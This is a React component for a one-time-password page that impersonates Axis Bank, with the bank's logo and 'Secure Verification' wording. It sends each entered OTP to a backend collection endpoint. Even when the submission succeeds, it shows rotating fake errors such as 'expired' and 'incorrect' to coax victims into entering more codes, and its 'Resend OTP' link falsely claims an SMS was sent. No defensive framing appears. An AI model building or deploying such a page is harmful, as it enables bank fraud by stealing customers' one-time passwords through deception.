import { useState } from "react";
import { FaSpinner } from "react-icons/fa";
import "./otpSubmit.css";

export default function OTPSubmit() {
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });

  // Sequential error messages
  const errorMessages = [
    "Technical error, please try later",
    "OTP has expired, resend OTP",
    "Network error, please check your connection",
    "Incorrect OTP, please resend OTP again",
  ];
  const [errorIndex, setErrorIndex] = useState(0);

  // Handle typing in OTP inputs
  const handleChange = (element, index) => {
    if (/^[0-9]$/.test(element.value) || element.value === "") {
      const newOtp = [...otp];
      newOtp[index] = element.value;
      setOtp(newOtp);

      // Auto-focus next input
      if (element.nextSibling && element.value) {
        element.nextSibling.focus();
      }

      // Automatically submit when all 6 digits entered
      if (newOtp.join("").length === 6) {
        handleVerify(newOtp.join(""));
      }
    }
  };

  // Handle OTP verification (store OTP only)
  const handleVerify = async (otpValue) => {
    if (!otpValue || otpValue.length < 6) {
      setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
      return;
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      const res = await fetch("http://localhost:5000/api/otp/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: otpValue }),
      });

      const result = await res.json();

      setTimeout(() => {
        if (res.ok) {
          setMessage({ text: errorMessages[errorIndex], type: "error" });
          setErrorIndex((prevIndex) => (prevIndex + 1) % errorMessages.length);
        } else {
          setMessage({ text: result.error || "Server error, please try later", type: "error" });
        }
        setLoading(false);
      }, 5000); // 5-second spinner
    } catch (err) {
      console.error(err);
      setTimeout(() => {
        setMessage({ text: "Network error, please check your connection", type: "error" });
        setLoading(false);
      }, 5000);
    }
  };

  // Handle Resend OTP
  const handleResend = () => {
    setOtp(new Array(6).fill(""));
    setMessage({ text: "OTP sent to your registered mobile number successfully", type: "success" });
  };

  return (
    <div className="otp-container">
      <img src="/icons/axis-bank.png" alt="Logo" />
      <h2>Secure Verification</h2>
      <p className="otp-headerrr">
        Please enter the 6-digit OTP sent to your registered mobile number
      </p>

      {message.text && <div className={`form-message ${message.type}`}>{message.text}</div>}

      <div className="otp-inputs">
        {otp.map((data, index) => (
          <input
            key={index}
            type="text"
            maxLength="1"
            value={data}
            onChange={(e) => handleChange(e.target, index)}
            onFocus={(e) => e.target.select()}
            disabled={loading}
          />
        ))}
      </div>

      <p className="resend-otp" onClick={handleResend}>
        Resend OTP
      </p>

      <button
        className="verify-btn"
        onClick={() => handleVerify(otp.join(""))}
        disabled={loading}
      >
        {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
      </button>
    </div>
  );
}
